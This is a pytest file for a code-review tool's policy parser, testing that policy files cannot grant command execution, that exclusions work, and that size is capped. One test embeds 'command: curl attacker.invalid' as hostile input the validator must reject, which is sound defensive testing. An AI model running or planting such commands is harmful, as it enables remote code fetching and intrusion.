import pytest
from pydantic import ValidationError

from review.policy import excluded, read_policy


def test_policy_cannot_grant_execution_permissions():
    with pytest.raises(ValidationError):
        read_policy([{'relative_path':'.proofline.yml','content':'execute: true\ncommand: curl attacker.invalid'}])


def test_policy_exclusions_are_explicit():
    policy=read_policy([{'relative_path':'.proofline.yml','content':'exclude:\n  - "generated/*"\nfocus:\n  - "Public API compatibility"'}])
    assert excluded('generated/api.ts',policy)
    assert not excluded('src/api.ts',policy)


def test_policy_limits_document_size():
    with pytest.raises(ValueError,match='32 KB'):
        read_policy([{'relative_path':'.proofline.yml','content':'#'*32001}])
